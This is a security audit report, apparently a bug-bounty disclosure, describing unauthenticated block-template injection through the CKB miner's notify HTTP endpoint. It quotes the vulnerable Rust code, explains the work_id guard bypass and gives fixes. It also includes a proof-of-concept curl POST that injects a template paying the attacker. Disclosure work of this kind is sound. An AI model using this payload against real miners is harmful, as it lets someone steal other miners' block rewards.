Audit Report

## Title
Unauthenticated Block Template Injection via Miner Notify HTTP Endpoint - (File: `miner/src/client.rs`)

## Summary
The CKB miner's notify-mode HTTP listener accepts `BlockTemplate` payloads from any source without authentication or origin validation. An attacker with network access to the miner's listen address can POST a crafted template containing an attacker-controlled `cellbase` transaction; the miner will solve the PoW puzzle and submit a valid block whose reward is paid to the attacker's lock script.

## Finding Description

The `handle` free function at `miner/src/client.rs` L358–369 is the entry point for every inbound HTTP connection on the notify listener:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

There is no `Authorization` header check, no source-IP allowlist, and no HMAC/token verification. Any HTTP client that can reach the socket is treated identically to the legitimate CKB node. [1](#0-0) 

The accepted template is forwarded to `update_block_template` (L293–312). The deduplication guard is:

```rust
let updated = |id| {
    if id != work_id || id == 0 {
        Some(work_id)
    } else {
        None
    }
};
```

Here `id` is the **currently stored** `current_work_id`. At construction it is initialised to `0` (`Arc::new(AtomicU64::new(0))`, L163), so the `id == 0` branch unconditionally accepts the very first injected template regardless of its `work_id` field. After that, any template whose `work_id` differs from the stored value satisfies `id != work_id` and is also accepted. Because the attacker does not need to know the current value — sending any large or random `work_id` is overwhelmingly likely to differ — the guard provides no meaningful protection. [2](#0-1) [3](#0-2) 

The `BlockTemplate` type includes `cellbase: CellbaseTemplate` (L75) and `transactions: Vec<TransactionTemplate>` (L69), both of which are used verbatim when the miner assembles and submits the block. The miner performs no independent verification of these fields against its configured CKB node. [4](#0-3) 

The notify listener is spawned whenever `config.listen` is `Some`, and the startup log explicitly instructs operators to expose the address to the CKB node — which in multi-machine deployments means binding to a non-loopback interface. [5](#0-4) 

## Impact Explanation

An attacker who can send a single HTTP POST to the miner's notify port can redirect all block rewards to an address they control. Because the CKB node validates only the PoW and consensus rules — not the identity of the reward recipient — it will commit the attacker-crafted block and pay the coinbase output to the attacker's lock script. Applied systematically across miners using the notify feature, this constitutes direct, repeatable theft of CKB issuance, matching the allowed bounty impact: **Critical — Vulnerabilities which could easily damage CKB economy**.

## Likelihood Explanation

- Notify mode is a **documented, production-supported feature** for multi-machine mining pool setups; the startup log actively instructs operators to expose the endpoint.
- In any multi-host deployment the listen address is a non-loopback address, making the port reachable from the LAN or internet depending on firewall configuration.
- The exploit requires only one HTTP POST with a well-formed JSON body — no credentials, no prior state, no cryptographic material.
- The `work_id` bypass is unconditional at startup and trivially achievable at any subsequent time by using a `work_id` value that differs from the current one.

## Recommendation

**Short term:**
- Add a configurable shared-secret bearer token to the miner config. In `handle`, reject any request that does not present the correct `Authorization: Bearer <token>` header before deserialising the body.
- Optionally restrict accepted connections to the IP address parsed from `config.rpc_url`.

**Long term:**
- After receiving a template via the notify path, cross-check `parent_hash` and `compact_target` against values independently fetched from the trusted RPC endpoint before dispatching work to miners.
- Treat all data arriving on the notify socket as untrusted input and validate critical fields (`cellbase`, `parent_hash`) against the miner's own chain-tip view.

## Proof of Concept

With the miner configured as `listen = "0.0.0.0:8888"`:

```bash
# At miner startup current_work_id == 0, so id == 0 branch fires unconditionally.
# After startup, use any work_id != current to satisfy id != work_id.
curl -X POST http://<miner-ip>:8888 \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x174c45e17a3",
    "number": "0x401",
    "epoch": "0x7080019000001",
    "parent_hash": "<valid tip hash>",
    "cycles_limit": "0xd09dc300",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": {
      "cycles": null,
      "data": { "<outputs pointing to attacker lock script>" },
      "hash": "<precomputed hash>"
    },
    "work_id": "0x0",
    "dao": "0xd495a106684401001e47c0ae1d5930009449d26e32380000000721efd0030000"
  }'
```

The miner accepts the template, workers begin hashing, and upon finding a valid nonce `submit_block` is called with the attacker-controlled block. The CKB node verifies PoW and commits the block; the block reward is paid to the attacker's lock script.

### Citations

**File:** miner/src/client.rs (L162-163)
```rust
        Client {
            current_work_id: Arc::new(AtomicU64::new(0)),
```

**File:** miner/src/client.rs (L204-232)
```rust
    pub fn spawn_background(self) {
        let client = self.clone();
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
            self.handle.spawn(async move {
                client.listen_block_template_notify(addr).await;
            });
            self.blocking_fetch_block_template();
        } else {
            ckb_logger::info!("loop poll mode: interval {}ms", self.config.poll_interval);
            self.handle.spawn(async move {
                client.poll_block_template().await;
            });
        }
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** util/jsonrpc-types/src/block_template.rs (L69-77)
```rust
    pub transactions: Vec<TransactionTemplate>,
    /// Provided proposal ids list of transactions for the new block.
    pub proposals: Vec<ProposalShortId>,
    /// Provided cellbase transaction template.
    ///
    /// Miners must use it as the cellbase transaction without changes in the assembled block.
    pub cellbase: CellbaseTemplate,
    /// Work ID. The miner must submit the new assembled and resolved block using the same work ID.
    pub work_id: Uint64,
```
